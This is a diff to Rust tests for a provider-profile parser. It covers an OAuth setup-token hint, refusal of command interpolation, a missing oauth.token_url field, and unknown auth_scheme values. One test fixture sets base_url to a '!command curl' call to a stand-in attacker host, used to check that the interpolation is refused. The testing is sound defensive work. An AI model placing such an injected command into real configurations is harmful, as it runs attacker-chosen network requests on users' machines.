@@ -87,8 +87,8 @@ fn exact_anthropic_oauth_toml_parses() {
         .and_then(|o| o.setup_token_hint.as_deref())
         .expect("setup_token_hint");
     assert!(
-        hint.contains('`'),
-        "hint fields may contain backticks: {hint}"
+        hint.contains("claude setup-token"),
+        "hint must name claude setup-token, got {hint}"
     );
 }
 
@@ -217,15 +217,13 @@ base_url = "!command curl https://evil.example"
 "#,
     )
     .expect_err("!command interpolation must refuse");
-    assert!(
-        matches!(interp_err, ProfileError::Interpolation { .. }),
-        "expected interpolation refuse, got {interp_err}"
-    );
-    let interp_text = interp_err.to_string();
-    assert!(
-        interp_text.contains('!') || interp_text.contains("$(") || interp_text.contains("backtick"),
-        "interpolation refuse should name the trigger, got {interp_text}"
-    );
+    match interp_err {
+        ProfileError::Interpolation { field, trigger } => {
+            assert_eq!(field, "base_url", "interpolation field");
+            assert_eq!(trigger, "!", "interpolation trigger");
+        }
+        other => panic!("expected interpolation refuse, got {other}"),
+    }
 
     let js_err = parse_via_file(
         "javascript-url.toml",
@@ -285,5 +283,56 @@ fn unknown_profile_id_lists_catalog_and_path_hint() {
     assert!(
         text.contains(".toml") || text.contains(".json"),
         "unknown id should mention a .toml or .json path, got {text}"
+    );
+}
+
+#[test]
+fn missing_oauth_token_url_names_dotted_field() {
+    let err = parse_via_file(
+        "no-token-url.toml",
+        r#"
+schema_version = 1
+id = "no-token-url"
+[oauth]
+client_id = "c"
+"#,
+    )
+    .expect_err("oauth without token_url must fail");
+    assert!(
+        matches!(err, ProfileError::MissingField("oauth.token_url")),
+        "must name oauth.token_url, got {err}"
+    );
+    assert!(
+        err.to_string().contains("oauth.token_url"),
+        "display must name oauth.token_url, got {err}"
+    );
+}
+
+#[test]
+fn unknown_auth_scheme_lists_legal_values() {
+    let err = parse_via_file(
+        "bad-scheme.toml",
+        r#"
+schema_version = 1
+id = "bad-scheme"
+auth_scheme = "Bearer"
+"#,
+    )
+    .expect_err("unknown auth_scheme must fail parse");
+    let text = err.to_string();
+    assert!(
+        text.contains("unknown auth_scheme `Bearer`"),
+        "must echo the unknown value, got {text}"
+    );
+    assert!(
+        text.contains("bearer")
+            && text.contains("x-api-key")
+            && text.contains("none")
+            && text.contains("header:<name>"),
+        "must list legal auth_scheme values, got {text}"
+    );
+    assert!(
+        text.to_ascii_lowercase().contains("did you mean") && text.contains("`bearer`"),
+        "Bearer should suggest bearer, got {text}"
     );
 }
